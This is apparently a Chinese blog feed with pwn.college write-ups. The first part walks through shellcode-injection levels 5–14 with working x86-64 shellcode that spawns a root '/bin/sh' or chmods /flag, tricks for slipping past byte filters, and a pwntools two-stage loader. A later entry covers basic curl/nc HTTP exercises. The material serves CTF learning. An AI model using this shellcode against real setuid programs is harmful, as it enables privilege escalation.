<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hacker@shellcode-injection~level5:~/shellcode-injection$ objdump -d ./shellcode</span><br><span class="line"></span><br><span class="line">./shellcode:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000401000 &lt;_start&gt;:</span><br><span class="line">  401000:       48 c7 c7 00 00 00 00    mov    $0x0,%rdi</span><br><span class="line">  401007:       48 c7 c0 69 00 00 00    mov    $0x69,%rax</span><br><span class="line">  40100e:       0f 05                   syscall</span><br><span class="line">  401010:       48 c7 c0 3b 00 00 00    mov    $0x3b,%rax</span><br><span class="line">  401017:       48 8d 3d 10 00 00 00    lea    0x10(%rip),%rdi        # 40102e &lt;binsh&gt;</span><br><span class="line">  40101e:       48 c7 c6 00 00 00 00    mov    $0x0,%rsi</span><br><span class="line">  401025:       48 c7 c2 00 00 00 00    mov    $0x0,%rdx</span><br><span class="line">  40102c:       0f 05                   syscall</span><br><span class="line"></span><br><span class="line">000000000040102e &lt;binsh&gt;:</span><br><span class="line">  40102e:       2f                      (bad)</span><br><span class="line">  40102f:       62                      (bad)</span><br><span class="line">  401030:       69                      .byte 0x69</span><br><span class="line">  401031:       6e                      outsb  %ds:(%rsi),(%dx)</span><br><span class="line">  401032:       2f                      (bad)</span><br><span class="line">  401033:       73 68                   jae    40109d &lt;binsh+0x6f&gt;</span><br></pre></td></tr></table></figure>

<p>syscall对应的字节码是0f05，只要没有硬编码的0x0f05即可，那就弄个0x0e05,用inc加成0x0f05,最后jmp一下就行</p>
<p>这是在堆栈上放置0x050e</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line">	</span><br><span class="line">    lea rdi,[rip+binsh]</span><br><span class="line">    push 0</span><br><span class="line">    push 0x702d </span><br><span class="line">    mov rdx,rsp</span><br><span class="line">    push 0x0</span><br><span class="line">    push rdx</span><br><span class="line">    push rdi</span><br><span class="line">    mov rsi,rsp</span><br><span class="line">    </span><br><span class="line">    mov rdx,0</span><br><span class="line">    mov rax,0x3b</span><br><span class="line"></span><br><span class="line">    push 0x050e</span><br><span class="line">    inc byte ptr [rsp]</span><br><span class="line">    jmp rsp</span><br><span class="line">    nop</span><br><span class="line"></span><br><span class="line">binsh:  .string &quot;/bin/sh&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="level6-0x1000的不可写"><a href="#level6-0x1000的不可写" class="headerlink" title="level6 0x1000的不可写"></a>level6 0x1000的不可写</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">puts(&quot;Removing write permissions from first 4096 bytes of shellcode.\n&quot;);</span><br><span class="line">    assert(mprotect(shellcode_mem, 4096, PROT_READ|PROT_EXEC) == 0);</span><br></pre></td></tr></table></figure>

<p>使前0x1000byte数据不可写，但没关系，我们上一关用的是堆栈，而且&#x2F;bin&#x2F;sh是直接硬编码到shellcode</p>
<h1 id="level7-关闭stdin，stdout，stderr"><a href="#level7-关闭stdin，stdout，stderr" class="headerlink" title="level7 关闭stdin，stdout，stderr"></a>level7 关闭stdin，stdout，stderr</h1><p>level1提到的chmod其实就没问题，但是看到有个佬搓了个socket连接。。。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line"></span><br><span class="line">    mov rax, 90          </span><br><span class="line">    lea rdi, [rip+flag]  </span><br><span class="line">    mov rsi, 0x1A4        </span><br><span class="line">    syscall</span><br><span class="line">flag:</span><br><span class="line">    .string &quot;/flag&quot;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<h1 id="level8-shortshellcode"><a href="#level8-shortshellcode" class="headerlink" title="level8 shortshellcode"></a>level8 shortshellcode</h1><p>本关只有18字节的shellcode可写，但我们可以通过软连接的方法，再尽力压缩shellcode，比如用push，pop，使用低位寄存器之类的方法</p>
<p>当程序访问一个软链接时，linux会意识到这是一个软链接，然后读取原始文件</p>
<p>那就很简单了</p>
<p>如果说非常短的shellcode，前面的chmod一定算一个，只需设置三个寄存器(rdi,rsi,rax)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line"></span><br><span class="line">    mov al,90         </span><br><span class="line">    push 0x61</span><br><span class="line">    mov rdi,rsp</span><br><span class="line">    push 4</span><br><span class="line">    pop rsi      </span><br><span class="line">    syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我将flag软链接为当前目录下的a</p>
<p>看另外师傅的，还可以考虑execve(“.&#x2F;c”,0,0)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash -p</span><br><span class="line">cat /flag</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line"></span><br><span class="line">    mov al,0x3b</span><br><span class="line">    xor rsi,rsi</span><br><span class="line">    xor rdx,rdx</span><br><span class="line">    push 0x63</span><br><span class="line">    mov rdi,rsp</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>

<p>还有个新的指令</p>
<p>cdq:把eax的最高位赋给edx的每一位，这个指令只有1字节，这个就相当于xor edx,edx了</p>
<p>level 13和level14还有更变态的short shellcode</p>
<h1 id="level9-跳过中断"><a href="#level9-跳过中断" class="headerlink" title="level9 跳过中断"></a>level9 跳过中断</h1><p>挑战每隔10字节就会使用int 3覆写我们的shellcode，会变成这样</p>
<p>Address      |                      Bytes                    |          Instructions</p>
<hr>
<p>0x0000000016ec6000 | b0 3b                                         | mov al, 0x3b<br>0x0000000016ec6002 | 48 31 f6                                      | xor rsi, rsi<br>0x0000000016ec6005 | 48 31 d2                                      | xor rdx, rdx<br>0x0000000016ec6008 | 6a 63                                         | push 0x63<br>0x0000000016ec600a | cc                                            | int3<br>0x0000000016ec600b | cc                                            | int3<br>0x0000000016ec600c | cc                                            | int3<br>0x0000000016ec600d | cc                                            | int3<br>0x0000000016ec600e | cc                                            | int3 </p>
<hr>
<p>原本的应该是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401000 &lt;_start&gt;:</span><br><span class="line">  401000:       b0 3b                   mov    $0x3b,%al</span><br><span class="line">  401002:       48 31 f6                xor    %rsi,%rsi</span><br><span class="line">  401005:       48 31 d2                xor    %rdx,%rdx</span><br><span class="line">  401008:       6a 63                   push   $0x63</span><br><span class="line">  40100a:       48 89 e7                mov    %rsp,%rdi</span><br><span class="line">  40100d:       0f 05                   syscall</span><br></pre></td></tr></table></figure>

<p>看了一下源码，对输入的shellcode进行处理，每过10字节变将其变成10字节的中断，那就用跳转来绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for (int i = 0; i &lt; shellcode_size; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if ((i / 10) % 2 == 1)</span><br><span class="line">        &#123;</span><br><span class="line">            ((unsigned char *) shellcode_mem)[i] = &#x27;\xcc&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line"></span><br><span class="line">    mov al,0x3b</span><br><span class="line">    xor rsi,rsi</span><br><span class="line">    xor rdx,rdx</span><br><span class="line">    jmp shell</span><br><span class="line">    .rept 10</span><br><span class="line">    nop</span><br><span class="line">    .endr</span><br><span class="line"></span><br><span class="line">shell:</span><br><span class="line">    push 0x63</span><br><span class="line">    mov rdi,rsp</span><br><span class="line">    syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="level10-排序shellcode"><a href="#level10-排序shellcode" class="headerlink" title="level10 排序shellcode"></a>level10 排序shellcode</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">This challenge just sorted your shellcode using bubblesort. Keep in mind the impact of memory endianness on this sort</span><br><span class="line">(e.g., the LSB being the right-most byte).</span><br><span class="line">This sort processed your shellcode 8 bytes at a time.</span><br></pre></td></tr></table></figure>

<p>挑战的描述其实有问题</p>
<p>他是把shellcode拆分成16字节，然后对其排序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int sort_max = shellcode_size / sizeof(uint64_t) - 1;</span><br><span class="line">    for (int i = 0; i &lt; sort_max; i++)</span><br><span class="line">        for (int j = 0; j &lt; sort_max-i-1; j++)</span><br><span class="line">            if (input[j] &gt; input[j+1])</span><br><span class="line">            &#123;</span><br><span class="line">                uint64_t x = input[j];</span><br><span class="line">                uint64_t y = input[j+1];</span><br><span class="line">                input[j] = y;</span><br><span class="line">                input[j+1] = x;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>但是只要shellcode长度小于16字节那也不会排序</p>
<h1 id="level11-关闭stdin的level10"><a href="#level11-关闭stdin的level10" class="headerlink" title="level11 关闭stdin的level10"></a>level11 关闭stdin的level10</h1><p>和上关一样，但是关闭了stdin</p>
<p>不清楚，但是level10秒了</p>
<h1 id="level12-无重复字节"><a href="#level12-无重复字节" class="headerlink" title="level12 无重复字节"></a>level12 无重复字节</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line">    </span><br><span class="line">    cdq</span><br><span class="line">    mov al,0x3b</span><br><span class="line">    xor esi,esi</span><br><span class="line">    push 0x63</span><br><span class="line">    mov rdi,rsp</span><br><span class="line">    syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>用objdump边看边改就行了</p>
<p>正好用到了之前的cdq</p>
<h1 id="level13-更短的shellcode"><a href="#level13-更短的shellcode" class="headerlink" title="level13 更短的shellcode"></a>level13 更短的shellcode</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shellcode_size = read(0, shellcode_mem, 0xc);</span><br></pre></td></tr></table></figure>

<p>这次只有0xc的长度，幸亏学到了cdq，这个只占一字节的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">.intel_syntax noprefix</span><br><span class="line">    </span><br><span class="line">    cdq</span><br><span class="line">    mov al,0x3b</span><br><span class="line">    xor esi,esi</span><br><span class="line">    push 0x63</span><br><span class="line">    mov rdi,rsp</span><br><span class="line">    syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>极限通过啊</p>
<h1 id="level14-丧心病狂的短"><a href="#level14-丧心病狂的短" class="headerlink" title="level14 丧心病狂的短"></a>level14 丧心病狂的短</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Reading 0x6 bytes from stdin.</span><br></pre></td></tr></table></figure>

<p>正常的shellcode肯定是凑不到那么短了，来gdb看一下程序内有什么可以利用的</p>
<p>执行shellcode时的场景</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">──────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────</span><br><span class="line">*RAX  0x0</span><br><span class="line"> RBX  0x5555555557e0 (__libc_csu_init) ◂— endbr64 </span><br><span class="line">*RCX  0x7ffff6d15297 ◂— cmp rax, -01000h /* &#x27;H=&#x27; */</span><br><span class="line">*RDX  0x214b7000 ◂— xor dword ptr [rdx], esi /* 0xa333231; &#x27;123\n&#x27; */</span><br><span class="line">*RDI  0x7ffff6df57e0 ◂— 0x0</span><br><span class="line">*RSI  0x7ffff6df4723 ◂— 0xdf57e0000000000a /* &#x27;\n&#x27; */</span><br><span class="line">*R8   0x16</span><br><span class="line">*R9   0x1c</span><br><span class="line">*R10  0x555555556113 ◂— 0x525245000000000a /* &#x27;\n&#x27; */</span><br><span class="line"> R11  0x246</span><br><span class="line"> R12  0x555555555200 (_start) ◂— endbr64 </span><br><span class="line"> R13  0x7fffffffdfd0 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x7fffffffdee0 ◂— 0x0</span><br><span class="line">*RSP  0x7fffffffdea0 —▸ 0x7fffffffdec6 ◂— 0x2710555552000000</span><br><span class="line">*RIP  0x5555555557c1 (main+634) ◂— call rdx</span><br><span class="line">───────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x5555555557c1 &lt;main+634&gt;              call   rdx                           &lt;0x214b7000&gt;</span><br><span class="line"> </span><br><span class="line">   0x5555555557c3 &lt;main+636&gt;              lea    rdi, [rip + 0cdah]</span><br><span class="line">   0x5555555557ca &lt;main+643&gt;              call   555555555130h                 &lt;puts@plt&gt;</span><br><span class="line"> </span><br><span class="line">   0x5555555557cf &lt;main+648&gt;              mov    eax, 0</span><br><span class="line">   0x5555555557d4 &lt;main+653&gt;              leave  </span><br><span class="line">   0x5555555557d5 &lt;main+654&gt;              ret    </span><br><span class="line"> </span><br><span class="line">   0x5555555557d6                         nop    word ptr cs:[rax + rax]</span><br><span class="line">   0x5555555557e0 &lt;__libc_csu_init&gt;       endbr64 </span><br><span class="line">   0x5555555557e4 &lt;__libc_csu_init+4&gt;     push   r15</span><br><span class="line">   0x5555555557e6 &lt;__libc_csu_init+6&gt;     lea    r15, [rip + 2553h]</span><br><span class="line">   0x5555555557ed &lt;__libc_csu_init+13&gt;    push   r14</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp 0x7fffffffdea0 —▸ 0x7fffffffdec6 ◂— 0x2710555552000000</span><br><span class="line">01:0008│-038 0x7fffffffdea8 —▸ 0x7fffffffdfe8 —▸ 0x7fffffffe29a ◂— 0x0</span><br><span class="line">02:0010│-030 0x7fffffffdeb0 —▸ 0x7fffffffdfd8 —▸ 0x7fffffffe267 ◂— 0x0</span><br><span class="line">03:0018│-028 0x7fffffffdeb8 ◂— 0x1555557e0</span><br><span class="line">04:0020│-020 0x7fffffffdec0 ◂— 0x0</span><br><span class="line">05:0028│-018 0x7fffffffdec8 ◂— 0x271055555200</span><br><span class="line">06:0030│-010 0x7fffffffded0 —▸ 0x7fffffffdfe0 ◂— 0x0</span><br><span class="line">07:0038│-008 0x7fffffffded8 —▸ 0x7fffffffe0d0 ◂— 0x0</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0   0x5555555557c1 main+634</span><br><span class="line">   1   0x7ffff6c2b083</span><br><span class="line">   2   0x7ffff7ffc620</span><br><span class="line">   3   0x7fffffffdfd8</span><br><span class="line">   4      0x100000000</span><br><span class="line">   5   0x555555555547 main</span><br><span class="line">   6   0x5555555557e0 __libc_csu_init</span><br><span class="line">   7 0x9d8be56ad6e8e1ce</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rax=0 (syscall_read)</span><br><span class="line">rdi=?</span><br><span class="line">rsi=?</span><br><span class="line">rdx=shellcode地址</span><br></pre></td></tr></table></figure>

<p>看起来可以使用read，将shellcode二次读入shellcode地址，二次shellcode前面应该填充一些nop，滑行一段距离保证能够执行到二次shellcode</p>
<p>但是如何二次向程序发送数据，好吧，还得是pwntools，赞美pwntools</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">p = process(&#x27;/challenge/babyshell_level14&#x27;)</span><br><span class="line">shellcode1=b&quot;\x31\xff\x89\xd6\x0f\x05&quot;</span><br><span class="line">shellcode2=asm(shellcraft.execve(&quot;/bin//sh&quot;,[&quot;/bin//sh&quot;,&quot;-p&quot;],0))</span><br><span class="line">shellcode2=asm(shellcraft.nop())*0x50+shellcode2</span><br><span class="line">#print(disasm(shellcode2))</span><br><span class="line">p.send(shellcode1)</span><br><span class="line">sleep(1)</span><br><span class="line">p.send(shellcode2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>shellcode1这里是读取shellcode的字节码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rsi,rax</span><br><span class="line">xor rax,rax</span><br><span class="line">push 0</span><br><span class="line">pop rdi</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>pwn-college</tag>
      </tags>
  </entry>
  <entry>
    <title>talking-web</title>
    <url>/2024/10/18/pwn-college-talking-web/</url>
    <content><![CDATA[<h1 id="概论"><a href="#概论" class="headerlink" title="概论"></a>概论</h1><p>本模块全部是使用<code>curl</code>,<code>nc</code>,<code>requests(python)</code>来完成web通信，都是非常基础的，简单写写就过吧</p>
<h1 id="Solutions"><a href="#Solutions" class="headerlink" title="Solutions"></a>Solutions</h1><h2 id="level1-3"><a href="#level1-3" class="headerlink" title="level1-3"></a>level1-3</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl 127.0.0.1:80</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc 127.0.0.1 80</span><br><span class="line"></span><br><span class="line">GET / HTTP/1.1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from requests import *</span><br><span class="line">data=get(&quot;http://127.0.0.1:80&quot;)</span><br><span class="line">print(data.text)</span><br></pre></td></tr></table></figure>

<h2 id="level4-6"><a href="#level4-6" class="headerlink" title="level4-6"></a>level4-6</h2><p>修改Host Header</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl 127.0.0.1:80 -H &quot;Host:&lt;value&gt;&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc 127.0.0.1 80</span><br><span class="line"></span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Host:&lt;value&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from requests import *</span><br><span class="line">header=&#123;</span><br><span class="line">	&quot;Host&quot;:&quot;&lt;value&gt;&quot;</span><br><span class="line">&#125;</span><br><span class="line">data=get(&quot;http://127.0.0.1:80&quot;,headers=header)</span><br><span class="line">print(data.text)</span><br></pre></td></tr></table></figure>

<h2 id="level7-9"><a href="#level7-9" class="headerlink" title="level7-9"></a>level7-9</h2><p>访问特定路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl 127.0.0.1:80/&lt;path&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc 127.0.0.1 80</span><br><span class="line"></span><br><span class="line">GET /&lt;path&gt; HTTP/1.1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from requests import *</span><br><span class="line">data=get(&quot;http://127.0.0.1:80/&lt;path&gt;&quot;)</span><br><span class="line">print(data.text)</span><br></pre></td></tr></table></figure>

<h2 id="level10-12"><a href="#level10-12" class="headerlink" title="level10-12"></a>level10-12</h2><p>对路径编码(URL)</p>
<p>将路径中的空格，#，&amp;等符号编码为URL编码后同<code>7-9</code></p>
<h2 id="level13-15"><a href="#level13-15" class="headerlink" title="level13-15"></a>level13-15</h2><p>提供单个参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl 127.0.0.1:80?a=&lt;value&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc 127.0.0.1 80</span><br><span class="line"></span><br><span class="line">GET /?a=&lt;value&gt; HTTP/1.1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from requests import *</span><br><span class="line">data=get(&quot;http://127.0.0.1:80&quot;,params=&#123;&quot;a&quot;:&quot;example&quot;&#125;)</span><br><span class="line">print(data.text)</span><br></pre></td></tr></table></figure>

<h2 id="level16-18"><a href="#level16-18" class="headerlink" title="level16-18"></a>level16-18</h2><p>需要两个参数，b需要进行编码处理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl 127.0.0.1:80?a=&lt;value&gt;&amp;b=&lt;value2&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc 127.0.0.1 80</span><br><span class="line"></span><br><span class="line">GET /?a=6ef373a3c8fe72904e0447f2b885b97b&amp;b=218d4108%209bd3ea27%262b218bbf%23495c256f HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from requests import *</span><br><span class="line">data=get(&quot;http://127.0.0.1:80&quot;,params=&#123;&quot;a&quot;:&quot;example&quot;,&quot;b&quot;:r&quot;example2&quot;&#125;)</span><br><span class="line">print(data.text)</span><br></pre></td></tr></table></figure>

<h2 id="level19-21"><a href="#level19-21" class="headerlink" title="level19-21"></a>level19-21</h2><p>POST</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST a=&lt;value&gt; 127.0.0.1:80</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc 127.0.0.1 80</span><br><span class="line"></span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 34</span><br><span class="line"></span><br><span class="line">a=&lt;value&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from requests import *</span><br><span class="line"></span><br><span class="line">data=post(&quot;http://127.0.0.1:80&quot;,data=&#123;&quot;a&quot;:&quot;&lt;value&gt;&quot;&#125;)</span><br><span class="line">print(data.text)</span><br></pre></td></tr></table></figure>

<h2 id="level22-24"><a href="#level22-24" class="headerlink" title="level22-24"></a>level22-24</h2><p>POST 两个参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -d a=&#x27;&lt;value&gt;&amp;b=&lt;value2&gt;&#x27; 127.0.0.1:80</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc 127.0.0.1 80</span><br><span class="line"></span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Host:127.0.0.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: &lt;len&gt;</span><br><span class="line"></span><br><span class="line">a=&lt;value&gt;</span><br><span class="line">b=&lt;value2&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from requests import *</span><br><span class="line">data=post(&quot;http://127.0.0.1:80&quot;,data=&#123;&quot;a&quot;:&quot;&lt;value&gt;&quot;,&quot;b&quot;:r&quot;&lt;value2&gt;&quot;&#125;)</span><br><span class="line">print(data.text)</span><br></pre></td></tr></table></figure>

<h2 id="level25-27"><a href="#level25-27" class="headerlink" title="level25-27"></a>level25-27</h2><p>只需增加一个Content -Type即可,注意，传输的数据应是json格式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -d &#x27;&#123;&quot;a&quot;:&quot;&lt;value&gt;&quot;&#125;&#x27; -H &quot;Content-Type: application/json&quot; 127.0.0.1:80</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc 127.0.0.1 80</span><br><span class="line"></span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 40  #注意长度</span><br><span class="line"></span><br><span class="line">&#123;&quot;a&quot;:&quot;724bb31bbe5f11101d6c07fce397910f&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>python要注意使用json打包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from requests import *</span><br><span class="line">import json</span><br><span class="line">data=post(&quot;http://127.0.0.1:80&quot;,headers=&#123;&quot;Content-Type&quot;:&quot;application/json&quot;&#125;,data=json.dumps(&#123;&quot;a&quot;:&quot;53dc330a682e4c38ea7b9baf9fd0cf2f&quot;&#125;))</span><br><span class="line">print(data.text)</span><br></pre></td></tr></table></figure>

<h2 id="level28"><a href="#level28" class="headerlink" title="level28"></a>level28</h2><p>较为复杂的JSON对象</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> curl -d &#x27;&#123;&quot;a&quot;:&quot;&lt;value1&gt;&quot;,&quot;b&quot;:&#123;&quot;c&quot;:&quot;&lt;value2&gt;&quot;,&quot;d&quot;:[&quot;&lt;value3&gt;&quot;,&quot;&lt;value3&gt;&quot;]&#125;&#125;&#x27; -H &quot;Content-T</span><br><span class="line">ype: application/json&quot; http://127.0.0.1:80</span><br></pre></td></tr></table></figure>

<h2 id="level29"><a href="#level29" class="headerlink" title="level29"></a>level29</h2><p>使用bash方便执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">json_payload=&#x27;&#123;</span><br><span class="line">    &quot;a&quot;: &quot;3756062c87aa10f389a287c784199c4c&quot;,</span><br><span class="line">    &quot;b&quot;: &#123;</span><br><span class="line">        &quot;c&quot;: &quot;c1fad6d2&quot;,</span><br><span class="line">        &quot;d&quot;: [&quot;bac1d43b&quot;, &quot;dfd0db29 78dc0d18&amp;ad0fc24e#9bd35059&quot;]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;&#x27;</span><br><span class="line"></span><br><span class="line"># Define the length of the JSON payload</span><br><span class="line">content_length=$(echo -n &quot;$json_payload&quot; | wc -c)</span><br><span class="line"></span><br><span class="line"># Send the HTTP request using nc</span><br><span class="line">&#123;</span><br><span class="line">    echo -ne &quot;POST / HTTP/1.1\r\n&quot;</span><br><span class="line">    echo -ne &quot;Host: 127.0.0.1\r\n&quot;</span><br><span class="line">    echo -ne &quot;Content-Type: application/json\r\n&quot;</span><br><span class="line">    echo -ne &quot;Content-Length: $content_length\r\n&quot;</span><br><span class="line">    echo -ne &quot;\r\n&quot;</span><br><span class="line">    echo -ne &quot;$json_payload&quot;</span><br><span class="line">&#125; | nc 127.0.0.1 80 | grep pwn.college&#123;</span><br></pre></td></tr></table></figure>

<p>主要卡在了计算Content-Length上</p>
<h2 id="level30"><a href="#level30" class="headerlink" title="level30"></a>level30</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from requests import *</span><br><span class="line">import json</span><br><span class="line">JSON=&#123;&quot;a&quot;:&quot;24d15198bf78c8a49316030c83a2cd73&quot;,&quot;b&quot;:&#123;&quot;c&quot;:&quot;512c400b&quot;,&quot;d&quot;:[&quot;aef2ba89&quot;,r&quot;8577e840 e4f7f4be&amp;91312c36#87765893&quot;]&#125;&#125;</span><br><span class="line">data=post(&quot;http://127.0.0.1:80&quot;,headers=&#123;&quot;Content-Type&quot;:&quot;application/json&quot;&#125;,data=json.dumps(JSON))</span><br><span class="line">print(data.text)</span><br></pre></td></tr></table></figure>

<p>还是python简单啊</p>
<h2 id="level31-33"><a href="#level31-33" class="headerlink" title="level31-33"></a>level31-33</h2><p>重定向，简单点了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -L 127.0.0.1:80</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc 127.0.0.1 80</span><br><span class="line"></span><br><span class="line">GET / HTTP/1.1</span><br><span class="line"></span><br><span class="line">GET /&lt;path&gt; HTTP/1.1  #第二次执行</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from requests import *</span><br><span class="line">#import json</span><br><span class="line">#JSON=&#123;&quot;a&quot;:&quot;24d15198bf78c8a49316030c83a2cd73&quot;,&quot;b&quot;:&#123;&quot;c&quot;:&quot;512c400b&quot;,&quot;d&quot;:[&quot;aef2ba89&quot;,r&quot;8577e840 e4f7f4be&amp;91312c36#87765893&quot;]&#125;&#125;</span><br><span class="line">data=post(&quot;http://127.0.0.1:80&quot;)</span><br><span class="line">print(data.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>py的requests不用管就会重定向</p>
<h2 id="level34-36"><a href="#level34-36" class="headerlink" title="level34-36"></a>level34-36</h2><p>cookie</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#首先获取cookie</span><br><span class="line">curl -c ./cookie 127.0.0.1</span><br><span class="line"></span><br><span class="line">curl -b &quot;cookie=&lt;cookie&gt;&quot; 127.0.0.1</span><br></pre></td></tr></table></figure>

